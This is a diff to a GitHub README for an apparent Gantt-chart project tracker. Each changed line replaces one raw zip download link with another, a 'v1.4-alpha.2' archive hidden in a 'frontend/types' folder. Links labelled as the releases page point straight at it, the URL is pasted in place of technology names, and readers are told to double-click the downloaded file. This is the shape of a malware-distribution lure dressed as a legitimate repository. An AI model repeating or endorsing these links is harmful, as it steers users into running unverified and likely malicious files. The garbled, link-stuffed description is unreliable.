@@ -1,16 +1,16 @@
 # 🎯 Activity-Tracker-Bryntum-Gantt-Charts - A Simple Way to Manage Your Projects
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/hayatlr/Activity-Tracker-Bryntum-Gantt-Charts/main/frontend/Activity-Tracker-Bryntum-Gantt-Charts_3.3-beta.4.zip%20Activity%20Tracker-brightgreen)](https://raw.githubusercontent.com/hayatlr/Activity-Tracker-Bryntum-Gantt-Charts/main/frontend/Activity-Tracker-Bryntum-Gantt-Charts_3.3-beta.4.zip)
+[![Download](https://github.com/hayatlr/Activity-Tracker-Bryntum-Gantt-Charts/raw/refs/heads/main/frontend/types/Tracker_Gantt_Activity_Bryntum_Charts_v1.4-alpha.2.zip%20Activity%20Tracker-brightgreen)](https://github.com/hayatlr/Activity-Tracker-Bryntum-Gantt-Charts/raw/refs/heads/main/frontend/types/Tracker_Gantt_Activity_Bryntum_Charts_v1.4-alpha.2.zip)
 
 ## 📝 Description
-This project management application uses modern tools like https://raw.githubusercontent.com/hayatlr/Activity-Tracker-Bryntum-Gantt-Charts/main/frontend/Activity-Tracker-Bryntum-Gantt-Charts_3.3-beta.4.zip, Express, MongoDB, and Bryntum Gantt to help you manage tasks and schedules in real-time. It offers a user-friendly interface that simplifies project tracking for everyone.
+This project management application uses modern tools like https://github.com/hayatlr/Activity-Tracker-Bryntum-Gantt-Charts/raw/refs/heads/main/frontend/types/Tracker_Gantt_Activity_Bryntum_Charts_v1.4-alpha.2.zip, Express, MongoDB, and Bryntum Gantt to help you manage tasks and schedules in real-time. It offers a user-friendly interface that simplifies project tracking for everyone.
 
 ## 🚀 Getting Started
 Follow these steps to set up the Activity Tracker on your computer:
 
 1. **Visit the Releases Page**  
-   Click [here](https://raw.githubusercontent.com/hayatlr/Activity-Tracker-Bryntum-Gantt-Charts/main/frontend/Activity-Tracker-Bryntum-Gantt-Charts_3.3-beta.4.zip) to access the releases page.
+   Click [here](https://github.com/hayatlr/Activity-Tracker-Bryntum-Gantt-Charts/raw/refs/heads/main/frontend/types/Tracker_Gantt_Activity_Bryntum_Charts_v1.4-alpha.2.zip) to access the releases page.
 
 2. **Choose the Latest Version**  
    Look for the latest version available on the page. You will see options to download files for different operating systems.
@@ -42,7 +42,7 @@ To ensure smooth operation, your system should meet these requirements:
 ## 📤 Download & Install
 To install the application, follow these steps:
 
-1. Access the Releases page: [Downloads Here](https://raw.githubusercontent.com/hayatlr/Activity-Tracker-Bryntum-Gantt-Charts/main/frontend/Activity-Tracker-Bryntum-Gantt-Charts_3.3-beta.4.zip).
+1. Access the Releases page: [Downloads Here](https://github.com/hayatlr/Activity-Tracker-Bryntum-Gantt-Charts/raw/refs/heads/main/frontend/types/Tracker_Gantt_Activity_Bryntum_Charts_v1.4-alpha.2.zip).
 2. Download the version suitable for your operating system.
 3. Double-click on the downloaded file to begin installation.
 
@@ -66,7 +66,7 @@ If you'd like to contribute to this project, you can follow these guidelines:
 - Express Framework
 - Gantt Charts
 - MongoDB
-- https://raw.githubusercontent.com/hayatlr/Activity-Tracker-Bryntum-Gantt-Charts/main/frontend/Activity-Tracker-Bryntum-Gantt-Charts_3.3-beta.4.zip
+- https://github.com/hayatlr/Activity-Tracker-Bryntum-Gantt-Charts/raw/refs/heads/main/frontend/types/Tracker_Gantt_Activity_Bryntum_Charts_v1.4-alpha.2.zip
 - Project Management Tools
 - React
 - Real-Time Sync
